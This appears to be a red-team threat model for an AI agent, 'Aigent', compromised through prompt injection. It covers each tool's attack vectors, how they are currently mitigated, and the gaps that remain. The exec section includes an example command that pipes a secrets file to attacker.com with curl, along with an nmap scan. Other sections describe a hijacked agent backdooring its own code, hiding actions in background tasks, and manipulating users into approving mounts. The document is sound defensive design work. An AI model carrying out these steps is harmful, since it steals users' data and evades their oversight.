# Aigent Red Team & Adversarial Analysis

This document explores the worst-case scenarios for a compromised Aigent instance. It assumes the sandbox has been hijacked (e.g., via a prompt injection attack from an untrusted webpage or MCP server) and evaluates the potential blast radius using the available tools.

## 1. Scope & Assumptions

*   **Attacker Goal:** Exfiltrate data (API keys, workspace files, host files), execute code on the host, or cause data destruction.
*   **Assumed Compromise:** The agent executes instructions provided by an attacker (indirect prompt injection) without the user noticing.
*   **User Posture:** The user might blindly approve some prompts, but we assume they will deny obvious anomalies (e.g., a sudden request to mount `/`).

## 2. Tool-by-Tool Vulnerability Analysis

### High Risk Tools

#### `exec` & `exec_readonly`
*   **Vector:** Execution of arbitrary shell commands.
*   **Attack:**
    *   **Data Exfiltration:** `cat /workspace/secrets.txt | curl -X POST -d @- https://attacker.com`.
    *   **Persistence:** Write a reverse shell or cron job (though Docker mitigates some persistence, the workspace survives restarts).
    *   **Lateral Movement:** Scan the local network (`nmap 192.168.1.0/24`) to find vulnerable internal services.
*   **Current Mitigation:** `checkExecPermission` uses a glob-based allow/prompt/deny list. Unlisted commands default to `prompt`. `sanitizedEnv` strips API keys.
*   **Remaining Gap:** If the attacker uses a command that happens to match an `alwaysAllow` glob (or obfuscates a command to bypass simple glob matching), they might achieve execution. Network scanning via `curl` or `nc` isn't fully blocked if not caught by the deny list.

#### `fetch`
*   **Vector:** Making outbound HTTP/HTTPS requests.
*   **Attack:**
    *   **Data Exfiltration:** Send contents of `/workspace/MEMORY.md` to an attacker-controlled endpoint.
    *   **SSRF (Server-Side Request Forgery):** Access internal APIs (e.g., AWS metadata endpoint, local router admin panel) that the host machine can reach.
*   **Current Mitigation:** `validateFetchUrl` blocks known private IP ranges (RFC 1918) and cloud metadata domains.
*   **Remaining Gap:** There is no restriction on *which* public domains can be contacted. Data exfiltration to `https://attacker.com` is trivial. DNS rebinding attacks (where a public hostname resolves to a private IP after the initial validation) might bypass the naive hostname check.

#### `request_mount`
*   **Vector:** Gaining access to the host filesystem.
*   **Attack:**
    *   **Host Compromise:** Request a mount for `~/.ssh` or `/etc`.
    *   **Social Engineering:** The attacker relies on the agent generating a plausible-sounding `reason` to trick the user into approving the mount.
*   **Current Mitigation:** Requires explicit user approval via the Web UI. Defaults to read-only (`ro`).
*   **Remaining Gap:** If the user is accustomed to approving mounts, they might rubber-stamp a malicious request disguised as a legitimate project requirement.

#### `host` (Host Capabilities)
*   **Vector:** Interacting directly with the host OS via the `aigent-host` daemon.
*   **Attack:**
    *   **Clipboard Theft/Poisoning:** Read sensitive data recently copied by the user, or write malicious payloads (e.g., a dangerous shell command) hoping the user pastes it.
    *   **Arbitrary Execution (via `open`):** Use the `open` capability with a malicious URI scheme (e.g., `file:///etc/passwd`, `javascript:`, or a vulnerability in a registered URI handler).
*   **Current Mitigation:** Requires user approval for sensitive capabilities.
*   **Remaining Gap:** The `open` capability currently lacks strict validation of the target URI scheme, making it a prime target for exploitation.

### Medium Risk Tools

#### `write_file`, `edit_file`, `patch`
*   **Vector:** Modifying files within the sandbox.
*   **Attack:**
    *   **Agent Hijacking:** Modify `/app/src/` (the agent's own code) to disable security checks or silently log conversations.
    *   **Data Destruction:** Overwrite user project files mounted in `/workspace`.
*   **Current Mitigation:** `validateWritePath` restricts writes to `/workspace`, `/project`, and `/tmp`. Docker filesystem permissions enforce this at the OS level.
*   **Remaining Gap:** The agent's source code (`/app/src`) might be writable depending on how the read-only self-mount is configured. If writable, an attacker can persistently backdoor the agent.

#### `spawn_agent` & `dispatch_task`
*   **Vector:** Creating parallel execution contexts.
*   **Attack:**
    *   **Resource Exhaustion (Denial of Service):** Spawn hundreds of background tasks, consuming all LLM tokens or host CPU/memory.
    *   **Evading Detection:** Perform malicious actions in a background task where the user is less likely to notice the immediate output.
*   **Current Mitigation:** Background agents use restricted, read-only tools (`exec_readonly`, `fetch_readonly`) by default.
*   **Remaining Gap:** A compromised main agent can explicitly grant write/network capabilities to a background task, bypassing the read-only defaults.

### Low Risk Tools

#### `read_file`, `list_files`, `grep`, `glob`, `tree`, `search_memory`
*   **Vector:** Reading data within the allowed sandbox paths.
*   **Attack:** Reconnaissance. Finding sensitive files within the workspace to later exfiltrate via `fetch` or `exec`.
*   **Current Mitigation:** Constrained to the Docker sandbox and explicitly mounted directories.
*   **Remaining Gap:** None, assuming the sandbox is properly isolated.

#### `screenshot`, `request_screenshot`
*   **Vector:** Capturing visual data.
*   **Attack:** Capturing sensitive information displayed on the screen (passwords, private messages).
*   **Current Mitigation:** `request_screenshot` requires the user to actively share their screen via the browser's `getDisplayMedia` API. `screenshot` only captures the isolated Xvfb virtual display inside the container.
*   **Remaining Gap:** Minimal, given the explicit consent required for host screenshots.

## 3. Recommended Remediation Strategy (Prioritized)

Based on this adversarial analysis, the following mitigations should be prioritized:

1.  **Strict Domain Allowlist for `fetch`:** This is the most critical missing piece. Without it, data exfiltration is trivial. Implement the `prompt/allow/deny` model for outbound network requests immediately.
2.  **Harden `host.open`:** Explicitly block `file://`, `javascript:`, and any non-`http(s)`/`mailto` schemes in the `host` tool's `open` capability to prevent arbitrary local execution.
3.  **Self-Modification Guardrails:** Ensure `/app/src/` is strictly read-only by default. Any modifications to the agent's core logic must require a specific `request_config_write`-style user approval flow with a visible diff.
4.  **Robust Environment Sanitization:** Ensure `sanitizedEnv` is aggressively stripping all potential secrets before passing the environment to `exec` or MCP servers. Consider an allowlist of safe environment variables rather than a denylist.
5.  **DNS Rebinding Protection:** Enhance `validateFetchUrl` to resolve the hostname to an IP address *before* checking against the private IP blocklist, mitigating DNS rebinding attacks.